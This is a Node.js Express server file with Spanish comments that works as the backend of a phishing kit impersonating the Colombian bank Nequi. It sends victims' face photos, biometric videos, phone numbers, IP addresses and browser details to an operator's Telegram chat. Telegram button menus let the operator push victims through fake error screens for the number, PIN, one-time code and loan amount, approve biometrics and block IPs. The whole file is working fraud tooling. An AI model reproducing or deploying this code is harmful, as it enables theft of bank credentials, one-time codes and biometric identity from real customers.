// 📦 Backend Dinámico para Nequi - Sistema de Control con Telegram

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
const multer = require('multer');
const upload = multer({ storage: multer.memoryStorage() });

const app = express();

// ==================== CONFIGURACIÓN CORS ====================
const corsOptions = {
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static('public'));

// ==================== VARIABLES DE ENTORNO ====================
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const RENDER_URL = process.env.RENDER_URL || 'https://portalnequi.onrender.com';

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('[WARN] BOT_TOKEN o CHAT_ID no definidos');
}

// ==================== ALMACENAMIENTO EN MEMORIA ====================
const redirections = new Map();
const bannedIPs = new Set();
const sessionData = new Map();
const biometricStatus = new Map(); // sessionId -> pending | approved | rejected

// ==================== FUNCIONES AUXILIARES ====================
const getTelegramApiUrl = (method) =>
  `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

function generateSessionId() {
  return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

// ==================== MENÚS TELEGRAM ====================
function getLoanSimulatorMenu(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '❌ Error Número', callback_data: `go:accces-sign-in|${sessionId}` },
        { text: '❌ Error Clave', callback_data: `go:access-sign-in-pass|${sessionId}` }
      ],
      [{ text: '🧬 Biometría', callback_data: `go:biometria|${sessionId}` }],
      [
        { text: '❌ Error Monto', callback_data: `go:loan-simulator-error|${sessionId}` },
        { text: '♻️ Pedir Dinámica', callback_data: `go:one-time-pass|${sessionId}` }
      ],
      [
        { text: '🚫 BANEAR', callback_data: `ban|${sessionId}` },
        { text: '✅ Consignar', callback_data: `go:consignar|${sessionId}` }
      ]
    ]
  };
}

function getDynamicMenu(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '❌ Error Dinámica', callback_data: `error-dynamic|${sessionId}` },
        { text: '❌ Error Número', callback_data: `go:accces-sign-in|${sessionId}` }
      ],
      [{ text: '🧬 Biometría', callback_data: `go:biometria|${sessionId}` }],
      [
        { text: '❌ Error Clave', callback_data: `go:access-sign-in-pass|${sessionId}` },
        { text: '❌ Error Monto', callback_data: `go:loan-simulator-error|${sessionId}` }
      ],
      [
        { text: '🚫 BANEAR', callback_data: `ban|${sessionId}` },
        { text: '✅ Consignar', callback_data: `go:consignar|${sessionId}` }
      ]
    ]
  };
}

// ==================== ENDPOINT PRINCIPAL ====================
app.get('/', (_req, res) => {
  res.json({ ok: true, status: 'running' });
});

// ==================== BIOMETRÍA POR FOTO ====================
app.post('/step-biometrics', async (req, res) => {
  try {
    const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;

    if (!sessionId || !imageBase64) {
      return res.status(400).json({ ok: false });
    }

    const session = sessionData.get(sessionId) || {};
    const buffer = Buffer.from(
      imageBase64.replace(/^data:image\/\w+;base64,/, ''),
      'base64'
    );

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', buffer, { filename: 'biometria.jpg' });

    formData.append(
      'caption',
`🧬 BIOMETRÍA FOTO

📱 ${phoneNumber || session.phoneNumber || 'N/A'}
🆔 ${sessionId}
🌐 ${ip || session.ip || 'N/A'}
🖥️ ${userAgent || 'N/A'}`
    );

    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
      headers: formData.getHeaders()
    });

    res.json({ ok: true });
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ ok: false });
  }
});

// ==================== BIOMETRÍA POR VIDEO ====================
app.post('/api/verify-video', upload.single('video'), async (req, res) => {
  try {
    if (!req.file) return res.json({ success: false });

    const sessionId = generateSessionId();
    biometricStatus.set(sessionId, 'pending');

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', req.file.buffer, {
      filename: 'biometria.webm'
    });

    formData.append(
      'caption',
`🎥 BIOMETRÍA VIDEO

🆔 Session: ${sessionId}`
    );

    await axios.post(getTelegramApiUrl('sendVideo'), formData, {
      headers: formData.getHeaders(),
      params: {
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ APROBAR', callback_data: `approve_bio|${sessionId}` },
              { text: '❌ RECHAZAR', callback_data: `reject_bio|${sessionId}` }
            ]
          ]
        }
      }
    });

    res.json({ success: true, sessionId });
  } catch (err) {
    console.error(err.message);
    res.json({ success: false });
  }
});

// ==================== CHECK BIOMETRÍA ====================
app.get('/api/check/:sessionId', (req, res) => {
  const status = biometricStatus.get(req.params.sessionId) || 'pending';
  res.json({ status });
});

// ==================== WEBHOOK TELEGRAM ====================
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const { callback_query } = req.body;
    if (!callback_query) return res.sendStatus(200);

    const [action, sessionId] = callback_query.data.split('|');

    if (action === 'approve_bio') {
      biometricStatus.set(sessionId, 'approved');
    }

    if (action === 'reject_bio') {
      biometricStatus.set(sessionId, 'rejected');
    }

    if (action === 'ban') {
      const s = sessionData.get(sessionId);
      if (s?.ip) bannedIPs.add(s.ip);
    }

    await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
      callback_query_id: callback_query.id,
      text: 'Acción registrada',
      show_alert: true
    });

    res.sendStatus(200);
  } catch (err) {
    console.error(err.message);
    res.sendStatus(200);
  }
});

// ==================== INICIAR SERVIDOR ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`✅ Servidor activo en ${PORT}`);
});
